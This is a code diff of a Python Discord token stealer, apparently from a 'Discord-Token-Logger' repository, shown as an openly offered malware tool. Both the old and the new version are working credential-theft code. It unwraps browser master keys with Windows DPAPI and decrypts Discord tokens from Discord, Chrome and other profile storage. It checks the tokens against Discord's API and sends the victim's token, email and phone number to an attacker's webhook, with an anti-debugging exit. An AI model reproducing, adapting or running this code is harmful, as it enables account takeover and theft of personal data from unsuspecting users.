@@ -3,127 +3,83 @@ import sys
 import re
 import json
 import base64
-import uuid
 import time
-import socket
-import shutil
 import ctypes
 import threading
-import platform
 import getpass
-import sqlite3
-import subprocess
-from datetime import datetime
-import win32crypt
 import requests
-import pyperclip
-from PIL import ImageGrab
+import win32crypt
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
+from datetime import datetime, timezone
 
-last_clipboard = ""
-WEBHOOK_URL = "" # Replace with your webhook
-WEBHOOK_USERNAME = "Token Stealer" 
-WEBHOOK_AVATAR = ""  
-username = getpass.getuser()
-payload = {
-    "username": WEBHOOK_USERNAME,
-    "embeds": [
-        {
-            "title": "", 
-            "description": f"",
-            "color": 16711680, 
-            "image": { 
-            }
-        }
-    ]
-}
-requests.post(WEBHOOK_URL, json=payload)
-def eio():
-    if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
+#------------------------------------------------------
+WEBHOOK = ""  # Set your webhook
+#-------------------------------------------------------
+USERNAME = "Token Grabber"
+AVATAR = ""
+LOCAL_USER = getpass.getuser()
+DEBUG = True
+def log(msg):
+    if DEBUG:
+        print(msg)
+def anti_debug():
+    if ctypes.windll.kernel32.IsDebuggerPresent():
         sys.exit(0)
-def encrypt_string(input_string):
-    key = get_random_bytes(16)
-    cipher = AES.new(key, AES.MODE_EAX)
-    ciphertext, tag = cipher.encrypt_and_digest(input_string.encode('utf-8'))
-    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')
-def send_webhook(content, username=WEBHOOK_USERNAME, avatar_url=WEBHOOK_AVATAR, title=None, encrypt=False):
-    eio()
-    if not WEBHOOK_URL:
-        return
+def send_webhook(content, title=None):
+    payload = {
+        "username": USERNAME,
+        "avatar_url": AVATAR,
+        "embeds": [{"description": content}]
+    }
+    if title:
+        payload["embeds"][0]["title"] = title
     try:
-        if encrypt:
-            content = encrypt_string(content)
-        embed = {"description": content}
-        if title:
-            embed["title"] = title
-        payload = {
-            "username": username,
-            "avatar_url": avatar_url,
-            "embeds": [embed]
-        }
-        requests.post(WEBHOOK_URL, json=payload, timeout=5)
-    except Exception as e:
-        print(f"Failed to send webhook: {e}")
-def send_file(filepath, title="ezstealer"):
-    anti_debug()
+        requests.post(WEBHOOK, json=payload, timeout=5)
+    except:
+        pass
+def get_master_key(state_path):
+    if not os.path.exists(state_path):
+        return None
     try:
-        with open(filepath, 'rb') as f:
-            files = {'file': f}
-            payload = {
-                "username": WEBHOOK_USERNAME,
-                "avatar_url": WEBHOOK_AVATAR,
-                "embeds": [{
-                    "title": title,
-                    "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
-                }]
-            }
-            requests.post(
-                WEBHOOK_URL,
-                data={"payload_json": json.dumps(payload)},
-                files=files,
-                timeout=10
-            )
-        os.remove(filepath)
+        with open(state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        enc_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
     except Exception as e:
-        print(f"{e}")
-def decrypt_payload(cipher, payload):
+        log(f"Failed {state_path} — {e}")
+        return None
+def decrypt_token(cipher, payload):
     try:
         return cipher.decrypt(payload)[:-16].decode()
-    except Exception as e:
-        print(f"")
+    except:
         return None
-def get_master_key(path):
-    try:
-        with open(path, 'r') as f:
-            local_state = json.load(f)
-        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
-        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-    except Exception as e:
-        print(f"")
-        return None
-def extract_tokens(path, key):
+def extract_tokens(leveldb_dir, key):
     tokens = []
-    token_pattern = re.compile(r'dQw4w9WgXcQ:[^"\'\']+')
-    if not os.path.exists(path):
-        return tokens
-    for filename in os.listdir(path):
-        if filename.endswith(".ldb") or filename.endswith(".log"):
-            try:
-                with open(os.path.join(path, filename), errors="ignore") as f:
-                    for line in f:
-                        for enc in token_pattern.findall(line):
-                            enc_token = base64.b64decode(enc.split(":")[1])
-                            iv = enc_token[3:15]
-                            payload = enc_token[15:]
+    pattern = re.compile(r'dQw4w9WgXcQ:[^"\\\']+')
+    if not os.path.isdir(leveldb_dir):
+        return []
+    for file in os.listdir(leveldb_dir):
+        if not file.endswith((".log", ".ldb")):
+            continue
+        try:
+            with open(os.path.join(leveldb_dir, file), "r", errors="ignore") as f:
+                for line in f:
+                    for match in pattern.findall(line):
+                        try:
+                            token_data = base64.b64decode(match.split(":")[1])
+                            iv = token_data[3:15]
+                            payload = token_data[15:]
                             cipher = AES.new(key, AES.MODE_GCM, iv)
-                            token = decrypt_payload(cipher, payload)
+                            token = decrypt_token(cipher, payload)
                             if token and token not in tokens:
                                 tokens.append(token)
-            except Exception as e:
-                print(f"{filename}: {e}")
+                        except:
+                            continue
+        except:
+            continue
     return tokens
-def rr():
+def find_tokens():
     targets = {
     "Discord": os.path.expandvars("%APPDATA%\\Discord"),
     "Discord Canary": os.path.expandvars("%APPDATA%\\discordcanary"),
@@ -166,69 +122,40 @@ def rr():
     "Chromium Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 3"),
     "Chromium System": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\System Profile"),
     "Firefox Profiles": os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles"),
-}
-    found_tokens = []
-    for name, path in targets.items():
-        local_state_path = os.path.join(path, "Local State")
-        key = get_master_key(local_state_path)
-        if not key:
+    }
+    all_tokens = []
+    for name, raw in targets.items():
+        base_path = os.path.expandvars(raw)
+        state_path = os.path.join(base_path, "Local State")
+        leveldb = os.path.join(base_path, "Local Storage", "leveldb")
+        if not os.path.exists(state_path) or not os.path.exists(leveldb):
             continue
-        leveldb = os.path.join(path, "Local Storage", "leveldb")
-        tokens = extract_tokens(leveldb, key)
-        found_tokens.extend(tokens)
-    for token in found_tokens:
+        key = get_master_key(state_path)
+        if key:
+            tokens = extract_tokens(leveldb, key)
+            all_tokens.extend(tokens)
+    return all_tokens
+def validate_and_send(tokens):
+    for token in tokens:
         try:
-            res = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
-            if res.status_code == 200:
-                user = res.json()
-                uid = base64.b64decode(token.split('.')[0] + '==').decode('utf-8', 'ignore')
-                info = (
-               f"💻 **User** `{getpass.getuser()}`\n"
-               f"🆔 **User ID** `{uid}`\n"
-               f"👤 **Username** `{user['username']}#{user['discriminator']}`\n"
-               f"📧 **Email** `{user.get('email', 'None')}`\n"
-               f"📱 **Phone Number** `{user.get('phone', 'None')}`\n"
-               f"🔑 **Discord Token** `{token}`\n"
-               f"🐙 **GitHub:** https://github.com/deadconvicess/Discord-Token-Logger"
+            r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
+            if r.status_code == 200:
+                user = r.json()
+                user_id = base64.b64decode(token.split('.')[0] + '==').decode("utf-8", errors="ignore")
+                msg = (
+                    f"🧑 **Discord Username**: `{user['username']}#{user['discriminator']}`\n"
+                    f"🆔 **User ID**: `{user_id}`\n"
+                    f"📧 **Email**: `{user.get('email', 'N/A')}`\n"
+                    f"📱 **Phone Number**: `{user.get('phone', 'N/A')}`\n"
+                    f"🔑 **Discord Token**: `{token}`\n"
+                    f"🐙 **GitHub:** https://github.com/deadconvicess/Discord-Token-Logger"
                 )
-                send_webhook(info, title=f"Token Logger - deadconvicss", encrypt=False)
+                send_webhook(msg, title="Token Logged")
         except Exception as e:
-            print(f"{e}")
-def get_mac():
-    try:
-        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,8)][::-1])
-        return mac.upper()
-    except:
-        return "Unavailable"
-def convert_bytes(size):
-    for x in ['B', 'KB', 'MB', 'GB', 'TB']:
-        if size < 1024:
-            return f"{size:.2f} {x}"
-        size /= 1024
+            log(f"failed {e}")
 if __name__ == "__main__":
-    eio()
-    rr()
+    anti_debug()
+    tokens = find_tokens()
+    validate_and_send(tokens)
     while True:
         time.sleep(1)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        
- 
- 
-                
